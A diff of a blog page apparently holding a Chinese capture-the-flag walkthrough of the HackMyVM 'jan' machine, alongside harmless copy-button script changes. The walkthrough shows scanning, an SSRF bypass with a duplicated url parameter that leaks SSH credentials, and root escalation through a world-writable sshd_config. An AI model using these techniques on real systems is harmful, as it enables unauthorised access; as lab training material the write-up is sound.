@@ -688,7 +688,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -721,13 +731,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>0.简介</h1>
-<p>靶机：<a href="https://hackmyvm.eu/machines/machine.php?vm=jan">https://hackmyvm.eu/machines/machine.php?vm=jan</a>
-难度：绿色
-目标 IP：192.168.205.136
+<p>靶机：<a href="https://hackmyvm.eu/machines/machine.php?vm=jan" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=jan</a><br>
+难度：绿色<br>
+目标 IP：192.168.205.136<br>
 本机 IP：192.168.205.128</p>
 <h1>1.扫描</h1>
 <p>nmap起手</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -A 192.168.205.136
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST
 Nmap scan report for 192.168.205.136
@@ -760,36 +770,36 @@ PORT     STATE SERVICE VERSION
 |_http-open-proxy: Proxy might be redirecting requests
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get
-SF:Request,A2,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
+SF:Request,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
 SF:5\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text/
 SF:plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Server
-SF:\.\x20Maybe\x20Internal\.&quot;)%r(HTTPOptions,A2,&quot;HTTP/1\.0\x20200\x20OK\r\
+SF:\.\x20Maybe\x20Internal\.")%r(HTTPOptions,A2,"HTTP/1\.0\x20200\x20OK\r\
 SF:nDate:\x20Mon,\x2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Lengt
 SF:h:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcom
-SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.&quot;)%r(RTSPReq
-SF:uest,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
+SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(RTSPReq
+SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
 SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
-SF:est&quot;)%r(FourOhFourRequest,A2,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
+SF:est")%r(FourOhFourRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
 SF:2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nCont
 SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x
-SF:20Public\x20Server\.\x20Maybe\x20Internal\.&quot;)%r(Socks5,67,&quot;HTTP/1\.1\x2
+SF:20Public\x20Server\.\x20Maybe\x20Internal\.")%r(Socks5,67,"HTTP/1\.1\x2
 SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
-SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(GenericLines,
-SF:67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
-SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)
-SF:%r(Help,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GenericLines,
+SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
+SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
+SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
 SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
-SF:equest&quot;)%r(SSLSessionReq,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
+SF:equest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
 SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
-SF:\n400\x20Bad\x20Request&quot;)%r(LPDString,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Re
+SF:\n400\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Re
 SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
-SF:20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(SIPOptions,67,&quot;HTTP/1\.1\x2040
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
 SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
-SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(OfficeScan,A3,&quot;H
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,"H
 SF:TTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20he
 SF:ader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
 SF:0close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
-SF:header&quot;);
+SF:header");
 MAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Device type: general purpose|router
 Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
@@ -807,18 +817,18 @@ Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
 </code></pre>
 <p>8080端口sT和sS参数探测不出来，所以建议不使用</p>
 <h1>2.踩点</h1>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.136:8080/                            
 Welcome to our Public Server. Maybe Internal.                                                                                                                                    
 </code></pre>
 <p>进行目录爆破</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                     
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben &quot;epi&quot; Risher 🤓                 ver: 2.11.0
+by Ben "epi" Risher 🤓                 ver: 2.11.0
 ───────────────────────────┬──────────────────────
  🎯  Target Url            │ http://192.168.205.136:8080
  🚀  Threads               │ 50
@@ -841,7 +851,7 @@ by Ben &quot;epi&quot; Risher 🤓                 ver: 2.11.0
 [####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/           
 </code></pre>
 <p>探索一波</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.136:8080/redirect
 Parameter 'url' needed.
                                                                                                                                     
@@ -854,7 +864,7 @@ Parameter 'url' needed.
 Only accessible internally.                                                                                                                                    
 </code></pre>
 <p>目前来看出题思路是通过/redirect访问/credz，进行尝试</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.136:8080/credz   
 Only accessible internally.                                                                                                                                    
 ┌──(kali㉿kali)-[~/test]
@@ -868,20 +878,20 @@ Content-Length: 27
 Content-Type: text/plain; charset=utf-8
 </code></pre>
 <p>这里我测试了挺多绕过检测的方法，我就不写出来了，正确方法是</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ curl &quot;http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=192.168.205.136:8080/credz&quot;
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=192.168.205.136:8080/credz"
                                          
 </code></pre>
 <p>返回空白，空白就是有机可寻</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ curl &quot;http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=127.0.0.1:8080/credz&quot;
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=127.0.0.1:8080/credz"
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
-└─$ curl &quot;http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz&quot;            
+└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz"            
 ssh/EazyLOL                                                                                                                                     
 </code></pre>
 <p>登录</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ssh ssh@192.168.205.136
 The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
 ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
@@ -904,7 +914,7 @@ jan:~$ id
 uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
 </code></pre>
 <h1>4.提权</h1>
-<pre><code>jan:~$ ls -al
+<pre class="notranslate"><code class="notranslate">jan:~$ ls -al
 total 12
 drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
 drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
@@ -915,21 +925,21 @@ Matching Defaults entries for ssh on jan:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 Runas and Command-specific defaults for ssh:
-    Defaults!/usr/sbin/visudo env_keep+=&quot;SUDO_EDITOR EDITOR VISUAL&quot;
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
 
 User ssh may run the following commands on jan:
     (root) NOPASSWD: /sbin/service sshd restart
 </code></pre>
 <p>大概率是改ssh的配置文件了，看看有没有权限</p>
-<pre><code>jan:~$ ls -al /etc/ssh/sshd_config
+<pre class="notranslate"><code class="notranslate">jan:~$ ls -al /etc/ssh/sshd_config
 -rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
 </code></pre>
 <p>有权限，那我们生成一个密钥，通过密钥登录root就好了</p>
-<pre><code>jan:~$ ssh-keygen -t rsa 
+<pre class="notranslate"><code class="notranslate">jan:~$ ssh-keygen -t rsa 
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
 Created directory '/home/ssh/.ssh'.
-Enter passphrase for &quot;/home/ssh/.ssh/id_rsa&quot; (empty for no passphrase): 
+Enter passphrase for "/home/ssh/.ssh/id_rsa" (empty for no passphrase): 
 Enter same passphrase again: 
 Your identification has been saved in /home/ssh/.ssh/id_rsa
 Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
@@ -960,8 +970,8 @@ drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
 
 jan:~$ vi /etc/ssh/sshd_config
 </code></pre>
-<p><img src="https://7r1umphk.github.io/image/20250331191252331.png" alt="image-20250331191252272" /></p>
-<pre><code>jan:~$ sudo /sbin/service sshd restart
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b6938070982a59fb6ab1f9552ed5b1b941dcc201cb4e2137f97c40082b8a7027/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139313235323333312e706e67"><img src="https://camo.githubusercontent.com/b6938070982a59fb6ab1f9552ed5b1b941dcc201cb4e2137f97c40082b8a7027/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139313235323333312e706e67" alt="image-20250331191252272" data-canonical-src="https://7r1umphk.github.io/image/20250331191252331.png" style="max-width: 100%;"></a></p>
+<pre class="notranslate"><code class="notranslate">jan:~$ sudo /sbin/service sshd restart
  * Stopping sshd ...                                                                                                             [ ok ]
  * Starting sshd ...                                                                                                             [ ok ]
 jan:~$ ssh root@127.0.0.1
@@ -969,10 +979,10 @@ jan:~$ ssh root@127.0.0.1
 /etc/ssh/ssh_config: terminating, 1 bad configuration options
 </code></pre>
 <p>banner应该也能提权，但是我不管它了</p>
-<pre><code>jan:~$ vi /etc/ssh/ssh_config
+<pre class="notranslate"><code class="notranslate">jan:~$ vi /etc/ssh/ssh_config
 </code></pre>
-<p><img src="https://7r1umphk.github.io/image/20250331191302731.png" alt="image-20250331191302680" /></p>
-<pre><code>jan:~$ ssh root@127.0.0.1
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/20d510ecf33e5574fdef728371a9ed71831cb10a7d78b4e88c84b02bf282e5f4/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139313330323733312e706e67"><img src="https://camo.githubusercontent.com/20d510ecf33e5574fdef728371a9ed71831cb10a7d78b4e88c84b02bf282e5f4/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139313330323733312e706e67" alt="image-20250331191302680" data-canonical-src="https://7r1umphk.github.io/image/20250331191302731.png" style="max-width: 100%;"></a></p>
+<pre class="notranslate"><code class="notranslate">jan:~$ ssh root@127.0.0.1
 The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
 ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
 This key is not known by any other names.
@@ -992,10 +1002,9 @@ jan:~# id
 uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 </code></pre>
 <h1>5.第二种方法</h1>
-<p><img src="https://7r1umphk.github.io/image/20250331191312690.png" alt="image-20250331191312627" /></p>
-<p>🔗<a href="https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83">https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83</a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e9948fde244b0c60f5e5eafe4b8e90d943de0337de1af55b73d07fb8149712b1/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139313331323639302e706e67"><img src="https://camo.githubusercontent.com/e9948fde244b0c60f5e5eafe4b8e90d943de0337de1af55b73d07fb8149712b1/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139313331323639302e706e67" alt="image-20250331191312627" data-canonical-src="https://7r1umphk.github.io/image/20250331191312690.png" style="max-width: 100%;"></a></p>
+<p>🔗<a href="https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83" rel="nofollow">https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83</a></p>
 <p>这个方法我没试过，自己尝试一下吧</p>
-<!-- raw HTML omitted -->
 </div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
@@ -1021,7 +1030,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -1068,7 +1077,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
